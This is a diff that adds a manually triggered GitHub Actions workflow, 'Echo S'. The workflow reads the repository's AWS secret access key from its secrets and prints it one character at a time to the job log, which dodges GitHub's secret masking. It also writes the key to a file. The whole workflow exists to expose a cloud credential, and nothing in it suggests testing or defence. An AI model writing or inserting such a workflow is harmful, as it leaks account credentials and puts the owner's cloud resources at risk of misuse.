@@ -1,0 +1,20 @@
+name: Echo S
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Set env as secret
+        env:
+          MY_VAL: ${{ secrets.VITECHRND_NIMBUS_AWS_SECRET_ACCESS_KEY }}
+        run: |
+          import os
+          data = open("file", "w")
+          for q in (os.getenv("MY_VAL")):
+            print(q)
+            data.write(q)
+        shell: python
